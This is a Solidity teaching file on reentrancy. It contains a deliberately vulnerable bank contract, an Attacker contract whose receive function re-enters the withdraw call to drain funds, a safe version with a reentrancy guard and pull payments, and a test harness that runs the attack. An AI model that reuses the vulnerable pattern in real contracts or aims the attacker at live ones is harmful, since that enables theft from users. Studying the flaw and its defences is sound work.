// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Vulnerable contract using low-level calls
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Event for logging withdrawals
    event WithdrawalAttempted(address user, uint256 amount, bool success);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // UNSAFE: Using low-level call without reentrancy protection
    function unsafeWithdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // DANGEROUS: Low-level call hands over control to recipient
        // This can lead to reentrancy attacks
        (bool success,) = msg.sender.call{ value: amount }("");

        // State change happens AFTER external call (VULNERABLE)
        if (success) {
            balances[msg.sender] -= amount;
        }

        emit WithdrawalAttempted(msg.sender, amount, success);
    }
}

// Malicious contract that exploits the vulnerable contract
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;
    uint256 public withdrawAmount;

    event AttackLog(string message, uint256 balance);

    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    // Function to start the attack
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ether to attack");

        // Initial deposit
        bank.deposit{ value: 1 ether }();
        withdrawAmount = 1 ether;

        // Start the attack
        bank.unsafeWithdraw(withdrawAmount);
    }

    // Receive function that gets called by the low-level call
    receive() external payable {
        attackCount++;
        emit AttackLog("Reentrance attack count:", attackCount);

        // If we still have balance and haven't attacked too many times
        if (address(bank).balance >= withdrawAmount && attackCount < 5) {
            // Reenter the withdraw function!
            bank.unsafeWithdraw(withdrawAmount);
        }
    }
}

// Safe contract using proper controls
contract SafeBank {
    mapping(address => uint256) public balances;
    bool private locked; // Reentrancy guard

    event WithdrawalCompleted(address user, uint256 amount);

    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // SAFE: Protected against reentrancy
    function safeWithdraw(uint256 amount) public noReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Update state BEFORE external call
        balances[msg.sender] -= amount;

        // External call happens last
        (bool success,) = msg.sender.call{ value: amount }("");
        require(success, "Transfer failed");

        emit WithdrawalCompleted(msg.sender, amount);
    }

    // Even safer: Pull payment pattern
    mapping(address => uint256) public pendingWithdrawals;

    function requestWithdrawal(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        pendingWithdrawals[msg.sender] += amount;
    }

    function completePendingWithdrawal() public noReentrant {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No pending withdrawal");

        pendingWithdrawals[msg.sender] = 0; // Update state first

        (bool success,) = msg.sender.call{ value: amount }("");
        require(success, "Transfer failed");
    }
}

// Test contract to demonstrate the attack
contract TestAttack {
    VulnerableBank public vbank;
    SafeBank public sbank;
    Attacker public attacker;

    constructor() {
        vbank = new VulnerableBank();
        sbank = new SafeBank();
    }

    function setupAndAttack() public payable {
        // Deploy attacker
        attacker = new Attacker(address(vbank));

        // Fund attacker and start attack
        attacker.attack{ value: msg.value }();
    }

    function checkBalances() public view returns (uint256 bankBalance, uint256 attackerBalance, uint256 attackCount) {
        bankBalance = address(vbank).balance;
        attackerBalance = address(attacker).balance;
        attackCount = attacker.attackCount();
    }
}
